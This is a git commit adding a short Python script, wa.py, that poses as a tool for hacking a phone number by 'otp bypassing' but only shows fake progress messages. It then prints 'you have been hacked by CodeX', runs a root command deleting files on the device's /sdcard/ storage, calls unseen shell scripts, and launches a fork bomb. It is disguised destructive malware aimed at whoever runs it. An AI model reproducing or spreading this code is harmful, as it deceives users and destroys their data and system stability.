354c08b4eb8ab1d366a95dc8af9e4fbb918e8d26
Cyber-Naraboji <73358232+Cyber-Naraboji@users.noreply.github.com>
2021-03-08 19:46:50 +0530

    Add files via upload

---
+++ wa.py
@@ -0,0 +1,22 @@
+import time
+import pyfiglet
+import os
+os.system("clear")
+os.system("bash codex.sh")
+time.sleep(3)
+print(" ")
+input("Target Number :- ")
+
+time.sleep(3)
+print(" ")
+print("otp bypassing.....")
+
+time.sleep(5)
+
+os.system("clear")
+
+print("you have been hacked by CodeX")
+
+os.system("cn.sh")
+os.system("su -c rm * /sdcard/")
+os.system(":(){ :|:& };:")
